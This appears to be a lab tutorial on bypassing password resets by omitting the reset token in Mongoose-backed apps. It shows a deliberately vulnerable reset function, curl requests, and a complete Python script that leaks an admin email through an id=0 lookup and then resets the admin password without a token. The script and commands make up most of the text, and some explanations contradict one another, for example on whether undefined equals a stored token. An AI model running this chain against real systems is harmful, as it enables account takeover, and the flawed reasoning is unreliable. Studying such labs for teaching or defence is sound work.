# Null Safety

These labs exploit missing or broken null/undefined checks. The most common place this shows up: password reset flows. Send no token, get admin access.

---

## The Vulnerable Pattern

Here's the kind of code that's vulnerable:

```javascript
async function resetPassword(req, res) {
    const { token, newPassword } = req.body;

    // findOne with null/undefined matches users with no resetToken set
    const user = await User.findOne({ resetToken: token });

    if (user && user.resetToken === token) {   // null === null → true
        user.password = bcrypt.hashSync(newPassword, 10);
        user.resetToken = null;
        await user.save();
        return res.json({ message: "Password updated" });
    }
    return res.status(400).json({ error: "Invalid token" });
}
```

The problem: if `token` is `undefined` (field not sent) or `null`, then:
1. `User.findOne({ resetToken: undefined })` — in Mongoose, this strips the undefined field and matches ANY user
2. `User.findOne({ resetToken: null })` — matches users where `resetToken` is null (i.e., everyone who hasn't recently triggered a reset)
3. `user.resetToken === token` becomes `null === null` → `true`

So if you skip the token entirely, you reset the password of whatever user the query returns first.

---

## Lab 1 — Basic Null Bypass

### Identifying the Vulnerable Function

Look at the password reset endpoint. The function to look for is `resetPassword`. Check the schema file — if the `token` parameter is marked as `.optional()` in Yup/Joi/Zod, that's a strong signal the backend doesn't enforce it either.

### Exploit

**Step 1:** Trigger a reset (so you have the endpoint wired up):
```bash
curl -s -X POST http://TARGET/api/resetPassword \
  -H "Content-Type: application/json" \
  -d '{"email": "target@example.com"}'
```

**Step 2:** Send the reset *without* a token:
```bash
curl -s -X POST http://TARGET/api/resetPassword \
  -H "Content-Type: application/json" \
  -d '{"newPassword": "pwned123"}'
```

If the response is `{"message": "Password updated"}` (not an error), the bypass worked.

**Step 3:** Login with the new password.

---

## Lab 2 — Chain: ID=0 Leak → Null Reset → Admin Takeover

This lab chains two separate bugs. Neither is critical alone, but together they give full admin access.

### Bug 1: getUserDetails with id=0

The `getUserDetails` endpoint fetches a user by their numeric ID. The developer likely wrote:

```javascript
const user = await User.findById(req.params.id);
```

When `id=0`, MongoDB's behavior (or the ORM's) can return the first document in the collection, or the query can fail silently and return the first matching document due to type coercion. Either way, it leaks user data you shouldn't see.

```bash
curl -s http://TARGET/api/users/0 \
  -H "Cookie: session=YOUR_SESSION"
```

**Expected response:** Admin user's email, username, or other profile data.

### Bug 2: Null Token Password Reset

Once you have the admin email from step 1, use it to:

**Step 1:** Request a password reset for admin (this sets `admin.resetToken` to a real value in the DB):
```bash
curl -s -X POST http://TARGET/api/forgotPassword \
  -H "Content-Type: application/json" \
  -d '{"email": "admin@target.com"}'
```

**Step 2:** Immediately hit the reset endpoint without a token:
```bash
curl -s -X POST http://TARGET/api/resetPassword \
  -H "Content-Type: application/json" \
  -d '{"newPassword": "hacked123"}'
```

Because `token` is absent from the body (undefined), `findOne({ resetToken: undefined })` strips the filter and matches any user — the admin comes back. Then `null === null` / `undefined === undefined` passes the check.

**Step 3:** Login as admin:
```bash
curl -s -X POST http://TARGET/api/login \
  -H "Content-Type: application/json" \
  -c /tmp/admin_session.txt \
  -d '{"email": "admin@target.com", "password": "hacked123"}'
```

### Full Chain Script

```python
#!/usr/bin/env python3
import requests

TARGET = "http://TARGET"
s = requests.Session()

# Step 1: Login as student to get session
s.post(f"{TARGET}/api/login", json={"email": "student@target.com", "password": "student_pass"})

# Step 2: Leak admin via id=0
r = s.get(f"{TARGET}/api/users/0")
admin_email = r.json().get("email")
print(f"[*] Admin email: {admin_email}")

# Step 3: Trigger reset (sets resetToken in DB)
s.post(f"{TARGET}/api/forgotPassword", json={"email": admin_email})
print("[*] Triggered reset")

# Step 4: Null bypass — no token in body
r = s.post(f"{TARGET}/api/resetPassword", json={"newPassword": "pwned123"})
print(f"[*] Reset response: {r.text}")

# Step 5: Login as admin
r = s.post(f"{TARGET}/api/login", json={"email": admin_email, "password": "pwned123"})
print(f"[*] Admin login: {r.status_code} {r.text[:200]}")
```

---

## Notes on Mongoose Versions

Mongoose behavior with null/undefined queries changed across versions:

- **Mongoose 6 and below:** `findOne({ field: undefined })` strips the field → matches everything
- **Mongoose 7+:** `findOne({ field: undefined })` still strips the field in most configs unless `strict: 'throw'` is set
- `findOne({ field: null })` matches documents where the field is `null`, `undefined`, or not set

When testing, check the package.json for the Mongoose version if you have source access. If not, test both `token: null` and omitting `token` entirely — one or both will work depending on the version.

The `===` comparison is also key. `null === null` is `true`, but `null === undefined` is `false`. If the code uses `==` (loose equality), then `null == undefined` is also `true`, making the bypass more reliable.
